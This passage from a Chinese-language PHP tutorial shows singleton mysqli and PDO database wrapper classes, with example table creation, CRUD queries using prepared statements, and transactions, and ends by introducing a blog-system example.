class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="variable">$types</span>, ...<span class="variable">$values</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;connection-&gt;insert_id;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>)-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建表</span></span><br><span class="line"><span class="variable">$createTable</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">    name VARCHAR(50) NOT NULL,</span></span><br><span class="line"><span class="string">    email VARCHAR(100) NOT NULL,</span></span><br><span class="line"><span class="string">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createTable</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Table &#x27;users&#x27; created successfully\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating table: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据（普通查询）</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;INSERT INTO users (name, email) VALUES (&#x27;John Doe&#x27;, &#x27;john@example.com&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insert</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;New record created successfully\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$insert</span> . <span class="string">&quot;\n&quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入数据（预处理语句）</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;Jane Smith&quot;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&quot;jane@example.com&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users (name, email) VALUES (?, ?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$email</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;New record created using prepared statement\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$stmt</span>-&gt;error . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法插入数据</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Static User&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;static@example.com&#x27;</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;User created with ID: <span class="subst">$userId</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询数据</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, name, email FROM users&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Users:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; - Email: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No users found\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法查询数据</span></span><br><span class="line"><span class="variable">$users</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, name, email FROM users WHERE name = ?&quot;</span>, [<span class="string">&quot;John Doe&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$users</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Found users:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$users</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; - Email: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No users found with that name\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新数据</span></span><br><span class="line"><span class="variable">$update</span> = <span class="string">&quot;UPDATE users SET email=&#x27;newemail@example.com&#x27; WHERE name=&#x27;John Doe&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$update</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Record updated successfully\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error updating record: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数据</span></span><br><span class="line"><span class="variable">$delete</span> = <span class="string">&quot;DELETE FROM users WHERE name=&#x27;Jane Smith&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$delete</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Record deleted successfully\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error deleting record: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事务示例</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">begin_transaction</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;INSERT INTO users (name, email) VALUES (&#x27;Transaction User&#x27;, &#x27;transaction@example.com&#x27;)&quot;</span>);</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;INSERT INTO users (name, email) VALUES (&#x27;Another User&#x27;, &#x27;another@example.com&#x27;)&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 模拟错误</span></span><br><span class="line">    <span class="comment">// $conn-&gt;query(&quot;INVALID SQL&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Transaction completed successfully\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">rollback</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Transaction failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>

<h3 id="17-2-使用PDO"><a href="#17-2-使用PDO" class="headerlink" title="17.2 使用PDO"></a>17.2 使用PDO</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;test_db&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PDO数据库类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDODatabase</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态实例（单例模式）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 私有构造函数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=<span class="subst">$database</span>;charset=utf8&quot;</span>;</span><br><span class="line">            <span class="variable">$options</span> = [</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>,</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="variable constant_">FETCH_ASSOC</span>,</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_EMULATE_PREPARES</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pdo = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$options</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取单例实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>, <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>, <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$database</span> = <span class="string">&#x27;test_db&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pdo;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：执行查询</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：插入数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$placeholders</span> = <span class="title function_ invoke__">array_map</span>(function(<span class="variable">$key</span>) &#123; <span class="keyword">return</span> <span class="string">&quot;:<span class="subst">$key</span>&quot;</span>; &#125;, <span class="variable">$keys</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$keys</span>) . <span class="string">&quot;) VALUES (&quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$placeholders</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：开始事务</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">beginTransaction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：提交事务</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：回滚事务</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">rollBack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建连接</span></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">getInstance</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>)-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Connected to database using PDO\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建表</span></span><br><span class="line">    <span class="variable">$createTable</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">        name VARCHAR(50) NOT NULL,</span></span><br><span class="line"><span class="string">        email VARCHAR(100) NOT NULL,</span></span><br><span class="line"><span class="string">        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</span></span><br><span class="line"><span class="string">    )&quot;</span>;</span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$createTable</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Table &#x27;users&#x27; created successfully\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 插入数据（预处理语句）</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&quot;Alice Johnson&quot;</span>;</span><br><span class="line">    <span class="variable">$email</span> = <span class="string">&quot;alice@example.com&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users (name, email) VALUES (:name, :email)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:email&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;New record created using prepared statement\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用静态方法插入数据</span></span><br><span class="line">    <span class="variable">$userId</span> = <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;PDO Static User&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;pdo_static@example.com&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created with ID: <span class="subst">$userId</span>\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 查询数据</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, name, email FROM users&quot;</span>);</span><br><span class="line">    <span class="variable">$users</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$users</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Users:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot; - Email: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;email&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No users found\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用静态方法查询</span></span><br><span class="line">    <span class="variable">$johnUsers</span> = <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, name, email FROM users WHERE name = :name&quot;</span>, [<span class="string">&#x27;:name&#x27;</span> =&gt; <span class="string">&#x27;John Doe&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$johnUsers</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found John users:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$johnUsers</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ID: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] . <span class="string">&quot; - Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot; - Email: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;email&#x27;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No users named John found\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新数据</span></span><br><span class="line">    <span class="variable">$email</span> = <span class="string">&quot;updated@example.com&quot;</span>;</span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&quot;Alice Johnson&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;UPDATE users SET email = :email WHERE name = :name&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:email&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Record updated successfully\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 事务示例</span></span><br><span class="line">    <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Transaction User&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;pdo_transaction@example.com&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Another User&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;pdo_another@example.com&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 模拟错误</span></span><br><span class="line">        <span class="comment">// PDODatabase::query(&quot;INVALID SQL&quot;);</span></span><br><span class="line">        </span><br><span class="line">        <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">commit</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Transaction completed successfully\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="title class_">PDODatabase</span>::<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Transaction failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="综合大例子：博客系统"><a href="#综合大例子：博客系统" class="headerlink" title="综合大例子：博客系统"></a>综合大例子：博客系统</h2><p>以下是一个综合性的Web应用示例，包含所有前面介绍的知识点：</p>
